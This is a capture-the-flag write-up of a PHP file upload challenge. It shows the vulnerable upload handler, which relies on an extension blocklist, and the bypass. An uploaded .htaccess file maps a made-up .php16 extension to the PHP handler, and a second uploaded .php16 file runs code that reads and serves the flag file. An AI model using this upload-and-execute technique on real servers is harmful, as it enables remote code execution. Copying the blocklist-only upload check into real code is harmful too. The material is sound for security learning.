<h3>Port 20055 [Web]</h3>

<p>This wa PHP file upload challenge. We are provided with the following source code.</p>

<p>```php
<?php
    $storage<em>dir = "file</em>uploads/";
    $full<em>storage</em>path = $storage<em>dir . basename($</em>FILES["fileName"]["name"]);
    $file<em>ext = pathinfo($full</em>storage<em>path, PATHINFO</em>EXTENSION);
    $file<em>ext = strtolower($file</em>ext);
    $blocked<em>ext = ["php", "php2", "php3", "php4", "php5", "php6", "php7", "php8", "phps", "pht", "phtm", "phar", "phtml", "pgif", "shtml", "html", "inc", "cgi", "asp", "aspx", "config", "pl", "py", "rs", "rb", "vbhtml", "vbtm", "vb", "phpt", "phtml"];
    echo($file</em>ext);
    if (in<em>array($file</em>ext, $blocked_ext, true) === true){
    echo("<html><h1>Blocked file extension detected! File upload blocked!</h1></html>");
    exit(1);
    }</p>

<pre><code>// Check file size
if ($_FILES["fileName"]["size"] &gt; 500000) {
echo("&lt;html&gt;&lt;p&gt;Sorry, your file is too large.&lt;/p&gt;&lt;/html&gt;");
exit(2);
}

// Move the uploaded file
if (move_uploaded_file($_FILES["fileName"]["tmp_name"], $full_storage_path) === true){
echo("&lt;html&gt;&lt;p&gt;File has been uploaded successfully and is now available &lt;a href='/$full_storage_path'&gt;here&lt;/a&gt;! But can you figure out how to execute it?&lt;/html&gt;");
}
else{
echo("&lt;html&gt;&lt;p&gt;File was not successfully uploaded!&lt;/p&gt;&lt;/html&gt;");
}
</code></pre>

<p>?>
```</p>

<p>While most common PHP file extensions are blocked, <code>.htaccess</code> was not!</p>

<p>We could upload a <code>.htaccess</code> file to tell Apache to interpret some arbitrary file extension as a PHP file (e.g. <code>.php16</code>).</p>

<p>```http
Content-Disposition: form-data; name="fileName"; filename=".htaccess"
Content-Type: text/html</p>

<p>AddHandler application/x-httpd-php .php16      # Say all file with extension .php16 will execute php
```</p>

<p>Then, uploading any file with the <code>.php16</code> extension results in RCE, and we can download the flag..</p>

<p>```http
Content-Disposition: form-data; name="fileName"; filename="test.php16"
Content-Type: text/html</p>

<p><?php
$file = '/flag.png';</p>

<p>if (file_exists($file)) {
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
?>
```</p>
